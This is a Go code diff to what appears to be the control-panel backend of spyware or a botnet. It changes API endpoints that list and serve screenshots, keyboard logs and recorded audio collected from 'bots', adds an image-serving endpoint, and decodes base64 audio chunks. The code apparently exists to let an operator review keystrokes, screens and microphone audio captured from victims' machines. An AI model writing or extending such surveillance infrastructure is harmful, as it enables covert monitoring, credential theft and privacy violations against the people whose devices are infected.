@@ -32,6 +32,16 @@ func parseLimitOffset(r *http.Request, defLimit int) (int, int) {
 	return limit, offset
 }
 
+type screenshotMeta struct {
+	ID         uuid.UUID `json:"ID"`
+	BotID      uuid.UUID `json:"BotID"`
+	URL        string    `json:"URL,omitempty"`
+	Title      string    `json:"Title,omitempty"`
+	Timestamp  time.Time `json:"Timestamp"`
+	SessionID  string    `json:"SessionID,omitempty"`
+	Difference *float64  `json:"Difference,omitempty"`
+}
+
 // Screenshots is GET /api/v1/screenshots?id=<bot_id>&limit=&offset=
 func (a *MediaAPI) Screenshots(w http.ResponseWriter, r *http.Request) {
 	id, err := uuid.Parse(r.URL.Query().Get("id"))
@@ -41,12 +51,60 @@ func (a *MediaAPI) Screenshots(w http.ResponseWriter, r *http.Request) {
 	}
 	limit, offset := parseLimitOffset(r, 50)
 	var rows []models.BotScreenshot
-	if err := a.DB.Where("bot_id = ?", id).
+	if err := a.DB.Select("id, bot_id, url, title, timestamp, session_id, difference").
+		Where("bot_id = ?", id).
 		Order("timestamp DESC").Limit(limit).Offset(offset).Find(&rows).Error; err != nil {
 		JSONErr(w, http.StatusInternalServerError, "query failed")
 		return
 	}
-	JSONOK(w, rows)
+	out := make([]screenshotMeta, 0, len(rows))
+	for _, s := range rows {
+		out = append(out, screenshotMeta{
+			ID:         s.ID,
+			BotID:      s.BotID,
+			URL:        s.URL,
+			Title:      s.Title,
+			Timestamp:  s.Timestamp,
+			SessionID:  s.SessionID,
+			Difference: s.Difference,
+		})
+	}
+	JSONOK(w, out)
+}
+
+// ScreenshotImage is GET /api/v1/screenshots/{id}/image
+func (a *MediaAPI) ScreenshotImage(w http.ResponseWriter, r *http.Request) {
+	id, err := uuid.Parse(chi.URLParam(r, "id"))
+	if err != nil {
+		JSONErr(w, http.StatusBadRequest, "invalid id")
+		return
+	}
+	var row models.BotScreenshot
+	if err := a.DB.Select("image_data").Where("id = ?", id).First(&row).Error; err != nil {
+		JSONErr(w, http.StatusNotFound, "screenshot not found")
+		return
+	}
+	img := row.ImageData
+	if img == "" {
+		w.WriteHeader(http.StatusNoContent)
+		return
+	}
+	ct := "image/jpeg"
+	payload := img
+	if idx := strings.Index(img, ";base64,"); idx != -1 {
+		prefix := img[:idx]
+		ct = strings.TrimPrefix(prefix, "data:")
+		payload = img[idx+len(";base64,"):]
+	}
+	raw, err := base64.StdEncoding.DecodeString(payload)
+	if err != nil {
+		w.Header().Set("Content-Type", ct)
+		_, _ = w.Write([]byte(img))
+		return
+	}
+	w.Header().Set("Content-Type", ct)
+	w.Header().Set("Cache-Control", "public, max-age=86400, immutable")
+	_, _ = w.Write(raw)
 }
 
 // KeyboardLogs is GET /api/v1/keyboard-logs?id=&limit=&offset=&startTime=&endTime=
@@ -165,19 +223,22 @@ func (a *MediaAPI) AudioSessionMerge(w http.ResponseWriter, r *http.Request) {
 		JSONErr(w, http.StatusNotFound, "session not found")
 		return
 	}
-	var buf strings.Builder
+	var buf []byte
 	for _, row := range rows {
-		buf.WriteString(row.Recording)
-	}
-	merged, err := base64.StdEncoding.DecodeString(buf.String())
-	if err != nil {
-		// not base64 — return as is
-		w.Header().Set("Content-Type", "audio/webm")
-		_, _ = w.Write([]byte(buf.String()))
-		return
+		chunk := row.Recording
+		// Strip data-URL prefix if present
+		if idx := strings.Index(chunk, ";base64,"); idx != -1 {
+			chunk = chunk[idx+len(";base64,"):]
+		}
+		decoded, err := base64.StdEncoding.DecodeString(chunk)
+		if err != nil {
+			buf = append(buf, []byte(row.Recording)...)
+		} else {
+			buf = append(buf, decoded...)
+		}
 	}
 	w.Header().Set("Content-Type", "audio/webm")
-	_, _ = w.Write(merged)
+	_, _ = w.Write(buf)
 }
 
 // AudioChunk is GET /api/v1/audio/{id}
@@ -193,7 +254,11 @@ func (a *MediaAPI) AudioChunk(w http.ResponseWriter, r *http.Request) {
 		JSONErr(w, http.StatusNotFound, "recording not found")
 		return
 	}
-	data, err := base64.StdEncoding.DecodeString(row.Recording)
+	chunk := row.Recording
+	if idx := strings.Index(chunk, ";base64,"); idx != -1 {
+		chunk = chunk[idx+len(";base64,"):]
+	}
+	data, err := base64.StdEncoding.DecodeString(chunk)
 	if err != nil {
 		w.Header().Set("Content-Type", "audio/webm")
 		_, _ = w.Write([]byte(row.Recording))
